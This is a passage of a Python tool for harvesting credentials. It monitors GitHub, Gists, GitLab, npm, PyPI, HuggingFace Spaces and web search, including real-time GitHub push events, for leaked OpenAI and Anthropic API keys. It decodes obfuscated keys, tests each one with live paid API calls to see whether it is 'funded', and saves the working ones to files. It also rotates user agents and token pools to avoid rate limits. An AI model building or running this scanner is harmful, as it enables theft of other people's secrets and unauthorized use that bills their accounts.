            best = max(available, key=lambda x: x[1])
            return best[0]

        # All on cooldown — return the one that expires soonest
        soonest = min(self._tokens, key=lambda t: self._cooldowns.get(t, 0.0))
        wait = self._cooldowns.get(soonest, 0.0) - now
        if wait > 0:
            logger.warning(
                "[TokenPool] All %d tokens on cooldown. Soonest in %.0fs",
                len(self._tokens), wait,
            )
        return soonest

    def get(self) -> str | None:
        """Get the best available token (non-blocking)."""
        return self._pick_best()

    def mark_limited(self, token: str) -> None:
        """Mark a token as rate-limited (403/429). Uses reset header if available."""
        now = time.monotonic()
        reset_mono = self._reset_at.get(token)
        if reset_mono and reset_mono > now:
            cooldown_end = reset_mono
            cd_secs = reset_mono - now
        else:
            cooldown_end = now + self._fallback_cooldown
            cd_secs = self._fallback_cooldown
        self._cooldowns[token] = cooldown_end
        self._remaining[token] = 0
        available = self._count_available()
        logger.info(
            "[TokenPool] Token ...%s rate-limited, cooldown %.0fs. Available: %d/%d",
            token[-6:], cd_secs, available, len(self._tokens),
        )

    async def wait_for_available(self) -> str:
        """Get a token, async-waiting if all are on cooldown."""
        while True:
            token = self._pick_best()
            if token is None:
                return ""
            now = time.monotonic()
            ready_at = self._cooldowns.get(token, 0.0)
            if now >= ready_at:
                return token
            wait = ready_at - now + 0.1
            logger.info("[TokenPool] Waiting %.0fs for token ...%s", wait, token[-6:])
            await asyncio.sleep(wait)


@dataclasses.dataclass(frozen=True, slots=True)
class HttpResult:
    """Result of an HTTP request with body eagerly read."""
    status: int
    body: str
    json_data: Any | None = None
    headers: dict[str, str] = dataclasses.field(default_factory=dict)


class HttpClient:
    """Shared async HTTP client with connection pooling, semaphore gating,
    per-request UA rotation, and retry with exponential backoff."""

    def __init__(
        self,
        semaphore: asyncio.Semaphore,
        *,
        max_connections: int = 200,
        max_connections_per_host: int = 20,
        request_timeout: float = 15.0,
        max_retries: int = 3,
        backoff_base: float = 1.0,
    ) -> None:
        self._semaphore = semaphore
        self._ua = UserAgent()
        self._max_retries = max_retries
        self._backoff_base = backoff_base
        self._connector = aiohttp.TCPConnector(
            limit=max_connections,
            limit_per_host=max_connections_per_host,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
        )
        self._default_timeout = aiohttp.ClientTimeout(total=request_timeout)
        self._session: aiohttp.ClientSession | None = None

    async def _get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession(
                connector=self._connector,
                timeout=self._default_timeout,
            )
        return self._session

    async def request(
        self,
        method: str,
        url: str,
        *,
        headers: dict[str, str] | None = None,
        json_body: dict[str, Any] | None = None,
        params: dict[str, str] | None = None,
        timeout: float | None = None,
    ) -> HttpResult | None:
        """HTTP request with semaphore gating, UA rotation, and retry."""
        merged_headers: dict[str, str] = {"User-Agent": self._ua.random}
        if headers:
            merged_headers.update(headers)

        session = await self._get_session()
        req_timeout = aiohttp.ClientTimeout(total=timeout) if timeout else None

        for attempt in range(self._max_retries):
            try:
                async with self._semaphore:
                    async with session.request(
                        method, url,
                        headers=merged_headers,
                        json=json_body,
                        params=params,
                        timeout=req_timeout,
                    ) as resp:
                        try:
                            text = await resp.text()
                        except Exception:
                            text = ""

                        json_data = None
                        if "application/json" in (resp.content_type or ""):
                            try:
                                json_data = json.loads(text)
                            except Exception:
                                pass

                        # Capture rate-limit headers for TokenPool
                        resp_headers = {k: v for k, v in resp.headers.items()
                                        if k.lower().startswith("x-ratelimit")}

                        result = HttpResult(status=resp.status, body=text,
                                            json_data=json_data, headers=resp_headers)

                # Retry on transient server errors
                if result.status in (502, 503, 504) and attempt < self._max_retries - 1:
                    await asyncio.sleep(self._backoff_base * (2 ** attempt))
                    continue

                return result

            except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
                logger.warning("HTTP %s %s attempt %d/%d failed: %s", method, url[:80], attempt + 1, self._max_retries, exc)
                if attempt < self._max_retries - 1:
                    await asyncio.sleep(self._backoff_base * (2 ** attempt))
                    continue
                return None
        return None

    async def get(self, url: str, **kwargs: Any) -> HttpResult | None:
        return await self.request("GET", url, **kwargs)

    async def post(self, url: str, **kwargs: Any) -> HttpResult | None:
        return await self.request("POST", url, **kwargs)

    async def fetch_text(self, url: str, **kwargs: Any) -> str | None:
        """GET url and return body text, or None on failure."""
        result = await self.get(url, **kwargs)
        if result is not None and result.status == 200:
            return result.body
        return None

    async def close(self) -> None:
        if self._session and not self._session.closed:
            await self._session.close()


# ============================================================================
# SECTION 7: KEY VERIFIER
# ============================================================================


class KeyVerifier:
    """Verifies discovered API keys against provider endpoints without spending tokens."""

    def __init__(self, http: HttpClient) -> None:
        self._http = http

    async def verify(self, key_type: str, key: str) -> tuple[str, str]:
        if key_type == "OpenAI":
            return await self._verify_openai(key)
        if key_type == "Anthropic":
            return await self._verify_anthropic(key)
        return "UNKNOWN", "No verifier"

    async def _verify_openai(self, key: str) -> tuple[str, str]:
        """2-step OpenAI verification:
        1. GET /v1/models — alive check
        2. POST /v1/chat/completions — credit + billing_not_active check
        """
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}

        # Step 1: check if key is alive via free GET /v1/models
        result = await self._http.get(
            "https://api.openai.com/v1/models",
            headers=headers,
            timeout=10.0,
        )
        if result is None:
            return "ERROR", "Network"
        if result.status == 401:
            return "DEAD", "Invalid"
        if result.status == 403:
            body = result.json_data or {}
            msg = body.get("error", {}).get("message", "").lower()
            if "not active" in msg or "billing" in msg or "deactivated" in msg:
                return "EMPTY", "Account Not Active"
            return "DEAD", "Forbidden (region/org)"
        if result.status not in (200, 429):
            return "UNKNOWN", f"HTTP {result.status}"

        # If models returned 429 with insufficient_quota, key is alive but empty
        if result.status == 429:
            body = result.json_data or {}
            err = body.get("error", {}).get("type", "")
            if err == "insufficient_quota":
                return "EMPTY", "No Credit ($0)"

        # Step 2: test actual credit with API call (gpt-4o-mini, max_tokens=2)
        result = await self._http.post(
            "https://api.openai.com/v1/chat/completions",
            headers=headers,
            json_body={
                "model": "gpt-4o-mini",
                "messages": [{"role": "user", "content": "1"}],
                "max_tokens": 2,
            },
            timeout=15.0,
        )
        if result is None:
            return "FUNDED", "Alive (billing check timeout)"

        if result.status == 200:
            return "FUNDED", "Has Credit ($$)"
        if result.status == 429:
            body = result.json_data or {}
            err_type = body.get("error", {}).get("type", "")
            err_msg = body.get("error", {}).get("message", "").lower()
            if err_type == "insufficient_quota":
                return "EMPTY", "No Credit ($0)"
            if err_type == "billing_not_active" or "billing" in err_msg or "not active" in err_msg:
                return "EMPTY", "Billing Not Active"
            return "FUNDED", "Rate Limited (has credit)"
        if result.status == 403:
            body = result.json_data or {}
            err_type = body.get("error", {}).get("type", "")
            err_msg = body.get("error", {}).get("message", "").lower()
            if "not active" in err_msg or "billing" in err_msg or err_type == "billing_not_active":
                return "EMPTY", "Account Not Active"
            return "EMPTY", "Forbidden (billing issue)"
        if result.status == 401:
            return "DEAD", "Invalid"
        return "UNKNOWN", f"HTTP {result.status}"

    async def _verify_anthropic(self, key: str) -> tuple[str, str]:
        """2-step Anthropic verification: models endpoint (alive?) then messages (has credit?)."""
        headers = {
            "x-api-key": key,
            "anthropic-version": "2023-06-01",
            "Content-Type": "application/json",
        }

        # Step 1: check if key is alive via GET /v1/models
        result = await self._http.get(
            "https://api.anthropic.com/v1/models",
            headers=headers,
            timeout=10.0,
        )
        if result is None:
            return "ERROR", "Network"
        if result.status == 401:
            body = result.json_data or {}
            err = body.get("error", {}).get("type", "")
            if err == "authentication_error":
                return "DEAD", "Invalid Key"
            return "DEAD", "Auth Failed"
        if result.status == 403:
            return "DEAD", "Forbidden"

        # Step 2: test actual credit with minimal API call (haiku, max_tokens=1)
        result = await self._http.post(
            "https://api.anthropic.com/v1/messages",
            headers=headers,
            json_body={
                "model": "claude-3-5-haiku-20241022",
                "max_tokens": 1,
                "messages": [{"role": "user", "content": "1"}],
            },
            timeout=15.0,
        )
        if result is None:
            return "FUNDED", "Alive (billing check timeout)"

        if result.status == 200:
            return "FUNDED", "Has Credit ($$)"
        if result.status == 429:
            body = result.json_data or {}
            err = body.get("error", {}).get("type", "")
            if err == "rate_limit_error":
                return "FUNDED", "Rate Limited (has credit)"
            return "EMPTY", "Quota Exceeded"
        if result.status == 400:
            body = result.json_data or {}
            msg = body.get("error", {}).get("message", "").lower()
            if "credit" in msg or "billing" in msg:
                return "EMPTY", "No Credit ($0)"
            # 400 for other reasons means key works but request was bad -- key is alive
            return "FUNDED", "Alive (request rejected)"
        if result.status == 401:
            return "DEAD", "Invalid"
        return "UNKNOWN", f"HTTP {result.status}"



# ============================================================================
# SECTION 8: BASE SCANNER
# ============================================================================


class BaseScanner(ABC):
    """Abstract base providing key extraction, verification, and result persistence."""

    def __init__(
        self,
        patterns: dict[str, str],
        verifier: KeyVerifier,
        file_lock: asyncio.Lock,
        http: HttpClient,
        existing_keys: set[str],
        stats: KeyStats,
    ) -> None:
        self.patterns = patterns
        self.verifier = verifier
        self.file_lock = file_lock
        self.http = http
        self.existing_keys = existing_keys
        self.stats = stats
        self.processed: set[str] = set()

    @abstractmethod
    async def run(self) -> None: ...

    async def process_text(self, text: str, source: str) -> None:
        """Extract keys from text, verify them, and persist results."""
        if not text or len(text) > 4_000_000:
            return

        await self.stats.increment_scanned()

        # Fast prefix check
        has_prefix = any(prefix in text for prefix in _QUICK_PREFIXES)
        if not has_prefix:
            # Also check URL-encoded variants
            if not any(urllib.parse.quote(p) in text for p in _QUICK_PREFIXES):
                # Check base64-encoded variants
                has_b64 = False
                for p in _QUICK_PREFIXES:
                    b64p = base64.b64encode(p.encode()).decode().rstrip("=")
                    if b64p in text:
                        has_b64 = True
                        break
                if not has_b64:
                    return

        # URL-decode to catch encoded keys
        try:
            decoded = urllib.parse.unquote(text)
            if decoded != text:
                text = text + "\n" + decoded
        except Exception:
            pass

        # HTML entity decode
        try:
            html_decoded = html_mod.unescape(text)
            if html_decoded != text:
                text = text + "\n" + html_decoded
        except Exception:
            pass

        # Try to find and decode base64 chunks that might contain keys
        for b64match in re.finditer(r'[A-Za-z0-9+/]{60,}={0,2}', text):
            try:
                chunk = base64.b64decode(b64match.group(0)).decode("utf-8", errors="ignore")
                if any(p in chunk for p in _QUICK_PREFIXES):
                    text = text + "\n" + chunk
            except Exception:
                pass

        # Remove common line-continuation patterns that split keys
        text = re.sub(r"\\\n\s*", "", text)
        text = re.sub(r'"\s*\+\s*"', "", text)
        text = re.sub(r"'\s*\+\s*'", "", text)
        # Handle backtick template concatenation
        text = re.sub(r'`\s*\+\s*`', "", text)
        # Remove JSON string escapes (\")
        text = text.replace('\\"', '"')
        # Remove zero-width chars and other unicode tricks
        text = re.sub(r'[\u200b\u200c\u200d\ufeff]', '', text)
        # Handle Python f-string / format breaks
        text = re.sub(r'\}\s*\+\s*f?["\']', "", text)
        # Handle environment variable assignment patterns to extract value
        text = re.sub(r'export\s+\w+=', ' ', text)
        text = re.sub(r'\w+\s*[:=]\s*["\']?', ' ', text)

        for k_type, pattern in self.patterns.items():
            for match in re.finditer(pattern, text):
                key = match.group(0)

                if key in self.processed:
                    continue
                self.processed.add(key)
                if key in self.existing_keys:
                    continue

                status, detail = await self.verifier.verify(k_type, key)

                color = Fore.RED
                target_file: str | None = None

                if "FUNDED" in status:
                    color = Fore.GREEN
                    target_file = FUNDED_FILES.get(k_type, "openai_keys.txt")
                    await self.stats.add_funded(k_type)
                elif "EMPTY" in status:
                    color = Fore.YELLOW
                    target_file = EMPTY_TXT
                    await self.stats.add_empty(k_type)

                if "DEAD" not in status:
                    # Получаем текущие счетчики для отображения
                    funded_count = sum(self.stats.funded.values())
                    empty_count = sum(self.stats.empty.values())
                    total = funded_count + empty_count

                    print(
                        f"\n{color}[FOUND #{total}] {k_type}\n"
                        f"KEY: {key}\n"
                        f"STATUS: {status} ({detail})\n"
                        f"URL: {source}\n"
                        f"💰 Funded: {funded_count} | 📭 Empty: {empty_count}{Style.RESET_ALL}\n"
                    )
                    self.existing_keys.add(key)

                    if target_file:
                        async with self.file_lock:
                            try:
                                with open(target_file, "a", encoding="utf-8") as f:
                                    f.write(f"{key}\n")
                                    f.flush()
                                    os.fsync(f.fileno())
                            except OSError as exc:
                                logger.error("Failed to write result to disk: %s", exc)


# ============================================================================
# SECTION 9: SCANNER IMPLEMENTATIONS
# ============================================================================


class GitHubScanner(BaseScanner):
    """Scans GitHub Code Search results for exposed API keys."""

    def __init__(self, pool: TokenPool, dorks: list[str], *args: Any) -> None:
        super().__init__(*args)
        self.dorks = dorks
        self._pool = pool

    async def run(self) -> None:
        if self._pool.empty:
            return
        print(f"{Fore.CYAN}[GitHub] Starting Code Search...{Style.RESET_ALL}")
        for dork in self.dorks:
            await self._search_code(dork)
            await asyncio.sleep(0.5)

    async def _search_code(self, dork: str) -> None:
        print(f"{Fore.MAGENTA}[GitHub] Code: {dork}{Style.RESET_ALL}")
        for page in range(1, GITHUB_PAGES + 1):
            while True:
                token = await self._pool.wait_for_available()
                if not token:
                    return

                headers = {"Authorization": f"token {token}"}
                params = {
                    "q": dork,
                    "sort": "indexed",
                    "order": "desc",
                    "page": str(page),
                    "per_page": str(GITHUB_PER_PAGE),
                }
                result = await self.http.get(
                    "https://api.github.com/search/code",
                    headers=headers,
                    params=params,
                )
                if result is None:
                    logger.warning("[GitHub] Request failed for dork: %s page %d", dork, page)
                    break

                # Always feed rate-limit headers
                self._pool.update_limits(token, result.headers)

                if result.status == 200:
                    data = result.json_data or {}
                    tasks = []
                    for item in data.get("items", []):
                        raw = (
                            item.get("html_url", "")
                            .replace("github.com", "raw.githubusercontent.com")
                            .replace("/blob/", "/")
                        )
                        tasks.append(self._fetch_raw(raw))
                    if tasks:
                        results = await asyncio.gather(*tasks, return_exceptions=True)
                        for r in results:
                            if isinstance(r, Exception):
                                logger.warning("[GitHub] Fetch task failed: %s", r)
                    break

                if result.status in (403, 429):
                    self._pool.mark_limited(token)
                    print(f"{Fore.YELLOW}[GitHub] Token limited, switching...{Style.RESET_ALL}")
                    continue

                if result.status == 422:
                    print(f"{Fore.YELLOW}[GitHub] 422 (bad query). Skipping: {dork}{Style.RESET_ALL}")
                    return

                logger.warning("[GitHub] Unexpected status %d for dork: %s", result.status, dork)
                break

            await asyncio.sleep(0.5)

    async def _fetch_raw(self, url: str) -> None:
        text = await self.http.fetch_text(url, timeout=10.0)
        if text:
            await self.process_text(text, url)


class GistScanner(BaseScanner):
    """Monitors public GitHub Gists for exposed API keys."""

    def __init__(self, pool: TokenPool, dorks: list[str], *args: Any) -> None:
        super().__init__(*args)
        self.dorks = dorks
        self._pool = pool

    async def run(self) -> None:
        if self._pool.empty:
            return
        print(f"{Fore.CYAN}[Gist] Scanning public snippets...{Style.RESET_ALL}")
        await self._monitor_public_gists()

    async def _monitor_public_gists(self) -> None:
        print(f"{Fore.MAGENTA}[Gist] Monitoring public gists...{Style.RESET_ALL}")
        result: HttpResult | None = None
        while True:
            token = await self._pool.wait_for_available()
            if not token:
                return
            headers = {"Authorization": f"token {token}"}
            result = await self.http.get(
                "https://api.github.com/gists/public?per_page=100",
                headers=headers,
            )
            if result is not None:
                self._pool.update_limits(token, result.headers)
            if result is not None and result.status in (403, 429):
                self._pool.mark_limited(token)
                print(f"{Fore.YELLOW}[Gist] Token limited, switching...{Style.RESET_ALL}")
                continue
            break

        if result is None or result.status != 200:
            logger.warning("[Gist] Failed to fetch public gists")
            return

        data = result.json_data or []
        tasks = []
        for gist in data:
            for file_info in gist.get("files", {}).values():
                raw_url = file_info.get("raw_url")
                if raw_url:
                    tasks.append(self._fetch_raw(raw_url))

        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if isinstance(r, Exception):
                    logger.warning("[Gist] Fetch task failed: %s", r)

    async def _fetch_raw(self, url: str) -> None:
        text = await self.http.fetch_text(url)
        if text:
            await self.process_text(text, url)


class GitLabScanner(BaseScanner):
    """Scans GitLab code search for exposed API keys."""

    def __init__(self, pool: TokenPool, dorks: list[str], *args: Any) -> None:
        super().__init__(*args)
        self._pool = pool
        self.dorks = dorks

    async def run(self) -> None:
        if self._pool.empty:
            return
        print(f"{Fore.CYAN}[GitLab] Starting search...{Style.RESET_ALL}")
        for dork in self.dorks:
            await self._search_api(dork)
            await asyncio.sleep(0.5)

    async def _search_api(self, dork: str) -> None:
        print(f"{Fore.MAGENTA}[GitLab] Search: {dork}{Style.RESET_ALL}")
        params = {"scope": "blobs", "search": dork, "per_page": str(GITLAB_PER_PAGE)}
        result: HttpResult | None = None

        while True:
            token = await self._pool.wait_for_available()
            if not token:
                return
            headers = {"PRIVATE-TOKEN": token}
            result = await self.http.get(
                "https://gitlab.com/api/v4/search",
                headers=headers,
                params=params,
            )
            if result is not None:
                self._pool.update_limits(token, result.headers)
            if result is not None and result.status in (403, 429):
                self._pool.mark_limited(token)
                print(f"{Fore.YELLOW}[GitLab] Token limited, switching...{Style.RESET_ALL}")
                continue
            break

        if result is None or result.status != 200:
            logger.warning("[GitLab] Search failed for dork: %s", dork)
            return

        data = result.json_data or []
        tasks = []
        for item in data:
            pid, path = item.get("project_id"), item.get("path")
            if pid and path:
                enc_path = urllib.parse.quote(path, safe="")
                raw = f"https://gitlab.com/api/v4/projects/{pid}/repository/files/{enc_path}/raw?ref=master"
                tasks.append(self._fetch_gl(raw))

        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if isinstance(r, Exception):
                    logger.warning("[GitLab] Fetch task failed: %s", r)

    async def _fetch_gl(self, url: str) -> None:
        while True:
            token = await self._pool.wait_for_available()
            if not token:
                return
            headers = {"PRIVATE-TOKEN": token}
            result = await self.http.get(url, headers=headers, timeout=10.0)
            if result is not None:
                self._pool.update_limits(token, result.headers)
            if result is not None and result.status in (403, 429):
                self._pool.mark_limited(token)
                continue
            if result is not None and result.status == 200 and result.body:
                await self.process_text(result.body, url)
            return


class PyPiScanner(BaseScanner):
    """Scans PyPI package descriptions for exposed API keys."""

    def __init__(self, queries: list[str], *args: Any) -> None:
        super().__init__(*args)
        self.queries = queries

    async def run(self) -> None:
        print(f"{Fore.CYAN}[PyPI] Analyzing packages...{Style.RESET_ALL}")
        for q in self.queries:
            await self._search_pypi(q)

    async def _search_pypi(self, query: str) -> None:
        result = await self.http.get(f"https://pypi.org/pypi/{query}/json")
        if result is None or result.status != 200:
            return
        data = result.json_data or {}
        desc = data.get("info", {}).get("description", "")
        if desc:
            await self.process_text(desc, f"pypi/{query}")


class NpmScanner(BaseScanner):
    """Scans NPM packages for exposed API keys."""

    def __init__(self, queries: list[str], *args: Any) -> None:
        super().__init__(*args)
        self.queries = queries

    async def run(self) -> None:
        print(f"{Fore.CYAN}[NPM] Analyzing packages...{Style.RESET_ALL}")
        for q in self.queries:
            await self._search_npm(q)

    async def _search_npm(self, query: str) -> None:
        result = await self.http.get(
            f"https://registry.npmjs.org/-/v1/search?text={query}&size={NPM_SEARCH_SIZE}"
        )
        if result is None or result.status != 200:
            return

        data = result.json_data or {}
        tasks = []
        for obj in data.get("objects", []):
            pkg = obj.get("package", {}).get("name")
            ver = obj.get("package", {}).get("version")
            if pkg:
                tasks.append(self._fetch_pkg(f"https://unpkg.com/{pkg}@{ver}/index.js"))
                tasks.append(self._fetch_pkg(f"https://unpkg.com/{pkg}@{ver}/.env"))

        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if isinstance(r, Exception):
                    logger.warning("[NPM] Fetch task failed: %s", r)

    async def _fetch_pkg(self, url: str) -> None:
        text = await self.http.fetch_text(url)
        if text:
            await self.process_text(text, url)


class HuggingFaceScanner(BaseScanner):
    """Scans HuggingFace Spaces for exposed API keys."""

    def __init__(self, *args: Any) -> None:
        super().__init__(*args)
        self._queries = [
            "openai", "gpt", "claude", "anthropic", "llm",
            "chatbot", "sk-ant-", "anthropic-api", "ANTHROPIC_API_KEY",
            "open-webui", "librechat", "lobe-chat", "dify",
            "anything-llm", "big-agi", "ai-proxy", "langchain",
            "chatgpt", "gpt-4", "sk-proj-", "OPENAI_API_KEY",
        ]

    async def run(self) -> None:
        print(f"{Fore.CYAN}[HuggingFace] Searching Spaces...{Style.RESET_ALL}")
        for q in self._queries:
            await self._search_hf(q)

    async def _search_hf(self, query: str) -> None:
        result = await self.http.get(
            f"https://huggingface.co/api/spaces?search={query}&limit={HF_SPACES_LIMIT}&full=true"
        )
        if result is None or result.status != 200:
            return

        data = result.json_data or []
        tasks = []
        for space in data:
            sid = space.get("id")
            if sid:
                base = f"https://huggingface.co/spaces/{sid}/raw/main"
                tasks.append(self._fetch_file(f"{base}/app.py"))
                tasks.append(self._fetch_file(f"{base}/.env"))
                tasks.append(self._fetch_file(f"{base}/config.py"))

        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if isinstance(r, Exception):
                    logger.warning("[HuggingFace] Fetch task failed: %s", r)

    async def _fetch_file(self, url: str) -> None:
        text = await self.http.fetch_text(url)
        if text:
            await self.process_text(text, url)


class WebScanner(BaseScanner):
    """Searches the web via DuckDuckGo for exposed API keys."""

    def __init__(self, dorks: list[str], *args: Any) -> None:
        super().__init__(*args)
        self.dorks = dorks

    def _sync_search(self, dork: str) -> list[dict[str, Any]]:
        if not DDGS:
            return []
        try:
            time.sleep(random.uniform(0.5, 1.5))
            return _ddgs_search_in_subprocess(dork, max_results=WEB_MAX_RESULTS)
        except Exception as exc:
            logger.warning("[Web] Search failed for dork '%s': %s", dork, exc)
            return []

    async def run(self) -> None:
        if not DDGS:
            return
        print(f"{Fore.CYAN}[Web] Starting OSINT search...{Style.RESET_ALL}")
        for dork in self.dorks:
            print(f"{Fore.BLUE}[Web] Search: {dork}{Style.RESET_ALL}")
            search_results = await asyncio.to_thread(self._sync_search, dork)
            tasks = []
            for res in search_results:
                url = res.get("href")
                if url:
                    tasks.append(self._fetch_smart(url))
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for r in results:
                    if isinstance(r, Exception):
                        logger.warning("[Web] Fetch task failed: %s", r)

    async def _fetch_smart(self, url: str) -> None:
        """Fetch URL, normalizing raw content endpoints for common platforms."""
        if "gitlab.com" in url and "/blob/" in url:
            url = url.replace("/blob/", "/raw/")
        if "huggingface.co" in url and "/blob/" in url:
            url = url.replace("/blob/", "/raw/")
        if "pastebin.com" in url and "/raw/" not in url:
            url = url.replace("pastebin.com/", "pastebin.com/raw/")
        if "github.com" in url and "/blob/" in url:
            url = (
                url.replace("github.com", "raw.githubusercontent.com")
                .replace("/blob/", "/")
            )
        if "bitbucket.org" in url and "/src/" in url:
            url = url.replace("/src/", "/raw/")
        if "paste.ee" in url and "/r/" not in url and "/p/" in url:
            url = url.replace("/p/", "/r/")
        if "dpaste.com" in url and ".txt" not in url:
            url = url.rstrip("/") + ".txt"
        if "gist.github.com" in url and "/raw" not in url:
            url = url.rstrip("/") + "/raw"

        text = await self.http.fetch_text(url, timeout=10.0)
        if text:
            await self.process_text(text, url)


# ============================================================================
# SECTION 10: REAL-TIME SCANNERS (for VPS 24/7 operation)
# ============================================================================


class GitHubEventsScanner(BaseScanner):
    """Real-time monitor of GitHub public push events. Catches keys within seconds,
    even if the commit is deleted afterwards -- the patch is preserved."""

    def __init__(self, pool: TokenPool, *args: Any) -> None:
        super().__init__(*args)
        self._pool = pool
        self._seen_events: set[str] = set()
        self._max_seen: int = 50_000

    async def run(self) -> None:
        if self._pool.empty:
            return
        print(f"{Fore.CYAN}[Events] Real-time GitHub push monitoring started (every {EVENTS_POLL_INTERVAL}s){Style.RESET_ALL}")
        while True:
            try:
                await self._poll_events()
            except Exception as exc:
                logger.warning("[Events] Poll error: %s", exc)
            await asyncio.sleep(EVENTS_POLL_INTERVAL)

    async def _poll_events(self) -> None:
        # Fetch latest public events (up to 10 pages for more coverage)
        for page in range(1, 11):
            result: HttpResult | None = None
            while True:
                token = await self._pool.wait_for_available()
                if not token:
                    return
                headers = {"Authorization": f"token {token}"}
                result = await self.http.get(
                    f"https://api.github.com/events?per_page=100&page={page}",
                    headers=headers,
                )
                if result is not None:
                    self._pool.update_limits(token, result.headers)
                if result is not None and result.status in (403, 429):
                    self._pool.mark_limited(token)
                    continue
                break

            if result is None or result.status != 200:
                break

            events = result.json_data or []
            if not events:
                break

            tasks: list[Any] = []
            new_events = 0
            for event in events:
                eid = event.get("id", "")
                if eid in self._seen_events:
                    continue
                self._seen_events.add(eid)
                new_events += 1

                etype = event.get("type", "")

                if etype == "PushEvent":
                    payload = event.get("payload", {})
                    for commit in payload.get("commits", []):
                        patch_url = commit.get("url")
                        if patch_url:
                            tasks.append(self._fetch_commit_patch(patch_url))

                elif etype == "CreateEvent":
                    # New repo/branch created — might contain leaked keys
                    repo = event.get("repo", {}).get("name", "")
                    if repo:
                        # Check common files that leak keys
                        for fname in [".env", "config.json", "settings.py",
                                      "config.yaml", ".env.local"]:
                            raw = f"https://raw.githubusercontent.com/{repo}/main/{fname}"
                            tasks.append(self._fetch_raw_url(raw))

                elif etype == "GistEvent":
                    payload = event.get("payload", {})
                    gist = payload.get("gist", {})
                    for finfo in gist.get("files", {}).values():
                        raw = finfo.get("raw_url")
                        if raw:
                            tasks.append(self._fetch_raw_url(raw))

                elif etype == "PublicEvent":
                    # Repo just became public — high chance of leaked secrets
                    repo = event.get("repo", {}).get("name", "")
                    if repo:
                        for fname in [".env", ".env.local", ".env.production",
                                      "config.json", "config.yaml", "secrets.py",
                                      "docker-compose.yml"]:
                            raw = f"https://raw.githubusercontent.com/{repo}/main/{fname}"
                            tasks.append(self._fetch_raw_url(raw))

            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for r in results:
                    if isinstance(r, Exception):
                        logger.warning("[Events] Patch fetch failed: %s", r)

            # If no new events on this page, stop paging
            if new_events == 0:
                break

            await asyncio.sleep(0.2)

        # Cap memory
        if len(self._seen_events) > self._max_seen:
            to_keep = list(self._seen_events)[-25_000:]
            self._seen_events = set(to_keep)

    async def _fetch_raw_url(self, url: str) -> None:
        """Fetch a raw URL (no GitHub API token needed for raw.githubusercontent.com)."""
        text = await self.http.fetch_text(url, timeout=8.0)
        if text:
            await self.process_text(text, url)

    async def _fetch_commit_patch(self, url: str) -> None:
        while True:
            token = await self._pool.wait_for_available()
            if not token:
                return
            headers = {
                "Authorization": f"token {token}",
                "Accept": "application/vnd.github.v3.patch",
            }
            result = await self.http.get(url, headers=headers, timeout=10.0)
            if result is not None:
                self._pool.update_limits(token, result.headers)
            if result is not None and result.status in (403, 429):
                self._pool.mark_limited(token)
                continue
            if result is not None and result.status == 200 and result.body:
                await self.process_text(result.body, url)
            return


class GitHubIssuesScanner(BaseScanner):
    """Scans GitHub Issues and Pull Requests for exposed API keys."""

    def __init__(self, pool: TokenPool, *args: Any) -> None:
        super().__init__(*args)
        self._pool = pool
        self._search_queries = [
            "sk-proj-", "sk-ant-api", "OPENAI_API_KEY",
            "ANTHROPIC_API_KEY", "api_key sk-",
            "sk-ant-api03-", "sk-ant-api04-",
            "ANTHROPIC_API_KEY=", "OPENAI_API_KEY=sk-",
            "sk-svcacct-", "openai_api_key",
            "anthropic_api_key", "sk-ant-",
        ]

    async def run(self) -> None:
        if self._pool.empty:
            return
        print(f"{Fore.CYAN}[Issues] Scanning GitHub Issues/PRs...{Style.RESET_ALL}")
        for query in self._search_queries:
            await self._search_issues(query)
            await asyncio.sleep(1)

    async def _search_issues(self, query: str) -> None:
        print(f"{Fore.MAGENTA}[Issues] Search: {query}{Style.RESET_ALL}")
        for page in range(1, 4):  # 3 pages per query
            while True:
                token = await self._pool.wait_for_available()
                if not token:
                    return
                headers = {"Authorization": f"token {token}"}
                params = {
                    "q": query,
                    "sort": "created",
                    "order": "desc",
                    "page": str(page),
                    "per_page": "100"
                }
                result = await self.http.get(
                    "https://api.github.com/search/issues",
                    headers=headers,
                    params=params,
                )
                if result is None:
                    break

                self._pool.update_limits(token, result.headers)

                if result.status == 200:
                    data = result.json_data or {}
                    tasks = []
                    for item in data.get("items", []):
                        body = item.get("body", "")
                        if body:
                            tasks.append(self.process_text(body, item.get("html_url", "unknown")))
                    if tasks:
                        await asyncio.gather(*tasks, return_exceptions=True)
                    break

                if result.status in (403, 429):
                    self._pool.mark_limited(token)
                    continue

                break
            await asyncio.sleep(0.5)


class GitHubCommitsScanner(BaseScanner):
    """Scans GitHub Commits search for exposed API keys in commit diffs."""

    def __init__(self, pool: TokenPool, *args: Any) -> None:
        super().__init__(*args)
        self._pool = pool
        self._queries = [
            "sk-proj-", "sk-ant-api", "OPENAI_API_KEY=sk-",
            "ANTHROPIC_API_KEY=sk-ant-", "sk-svcacct-",
            "api_key sk-proj", "openai_api_key sk-",
            "sk-ant-api03-", "sk-ant-api04-",
            "ANTHROPIC_API_KEY=", "OPENAI_API_KEY=",
            "anthropic_api_key", "sk-ant-",
        ]

    async def run(self) -> None:
        if self._pool.empty:
            return
        print(f"{Fore.CYAN}[Commits] Scanning GitHub Commits...{Style.RESET_ALL}")
        for query in self._queries:
            await self._search_commits(query)
            await asyncio.sleep(1)

    async def _search_commits(self, query: str) -> None:
        print(f"{Fore.MAGENTA}[Commits] Search: {query}{Style.RESET_ALL}")
        for page in range(1, 4):
            while True:
                token = await self._pool.wait_for_available()
                if not token:
                    return
                headers = {
                    "Authorization": f"token {token}",
                    "Accept": "application/vnd.github.cloak-preview+json",
                }
                params = {
                    "q": query,
                    "sort": "committer-date",
                    "order": "desc",
                    "page": str(page),
                    "per_page": "100",
                }
                result = await self.http.get(
                    "https://api.github.com/search/commits",
                    headers=headers,
                    params=params,
                )
                if result is None:
                    break

                self._pool.update_limits(token, result.headers)

                if result.status == 200:
                    data = result.json_data or {}
                    tasks = []
                    for item in data.get("items", []):
                        commit_url = item.get("url")
